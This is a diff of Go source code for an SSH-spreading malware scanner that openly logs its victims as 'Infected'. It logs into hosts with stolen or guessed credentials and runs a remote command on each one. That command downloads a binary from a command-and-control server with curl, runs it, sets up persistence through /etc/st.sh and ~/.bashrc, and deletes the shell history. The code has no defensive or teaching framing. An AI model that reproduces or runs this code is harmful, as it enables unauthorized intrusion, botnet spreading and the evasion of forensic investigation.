@@ -44,17 +44,16 @@ func Scan() {
 			continue
 		}
 
-		wg.Add(1)
-		go func() {
-			ses, err := sshNew(serv[1], serv[2], serv[0])
-			if err != nil {
-				fmt.Println("[HOMO SCANNER] Can't Infect: " + serv[0] + ":22")
-				wg.Done()
-				return
-			}
+		ses, err := sshNew(serv[1], serv[2], serv[0])
+		if err != nil {
+			fmt.Println("[HOMO SCANNER] Can't Infect: " + serv[0] + ":22")
+			return
+		}
 
-			ses.Inject(&wg)
-		}()
+		ses.Inject()
+		fmt.Println("[HOMO SCANNER] Infected: " + serv[0] + ":22")
+		time.Sleep(1 * time.Second)
+
 	}
 }
 
@@ -83,7 +82,7 @@ func sshNew(login, pass string, host string) (*Sshsess, error) {
 	}, nil
 }
 
-func (sess *Sshsess) Inject(w *sync.WaitGroup) {
+func (sess *Sshsess) Inject() {
 
 	sshSesh, _ := sess.Session.NewSession()
 	var setSession bytes.Buffer
@@ -96,13 +95,12 @@ func (sess *Sshsess) Inject(w *sync.WaitGroup) {
 		host = config.GetConfig().Api.Server + ":" + config.GetConfig().Api.Port + config.GetConfig().Api.CustomPath
 	}
 
-	fmt.Println("[HOMO SCANNER] Infected: " + sess.Ip + ":22")
-
+	host = host
 	go func() {
+
 		sshSesh.Run("apt install curl -y; ulimit -n 999999; rm /bin/sysmonit.bin; curl -X POST http://" + host + " -o /bin/sysmonit.bin ; chmod +x /bin/sysmonit.bin ; /bin/sysmonit.bin & disown >> /etc/st.sh ; bash /etc/st.sh >> ~/.bashrc; bash /etc/st.sh ; rm ~/.bash_history")
 
 		sshSesh.Close()
 
 	}()
-	wg.Done()
 }
